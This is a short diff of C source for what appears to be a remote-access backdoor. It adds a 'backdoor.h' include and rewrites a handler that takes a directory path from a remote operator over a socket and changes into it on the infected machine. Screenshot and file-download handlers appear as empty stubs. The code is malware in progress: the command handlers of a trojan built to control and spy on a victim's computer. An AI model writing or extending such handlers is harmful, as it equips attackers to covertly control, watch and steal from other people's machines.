@@ -5,18 +5,23 @@
 #include <sys/stat.h>
 #include <errno.h>
 
+#ifndef _HANDLERS_
+#define _HANDLERS_
+
 #include "help.h"
-#include "utils.h"
+#include "backdoor.h"
 
 void change_directory_callback(char* result, int sock) {
 
-	send(sock, "Enter path: ", strlen("Enter path: "), 0);
+	send_data("Enter path: ", strlen("Enter path: "), TRUE);
 	
 	char path[1024];
 
-	recv(sock, path, 1024, 0);
+	char *pt = pop_data(path, 1024);
 
-	int response = chdir(path);
+	int response = chdir(pt);
+
+	free(pt);
 
 	if(response == -1) {
 		sprintf(result, "Error: %i\n", errno);
@@ -47,3 +52,5 @@ void screenshot_callback(char* result, int sock) {
 void download_file_callback(char* result, int sock) {
 
 }
+
+#endif
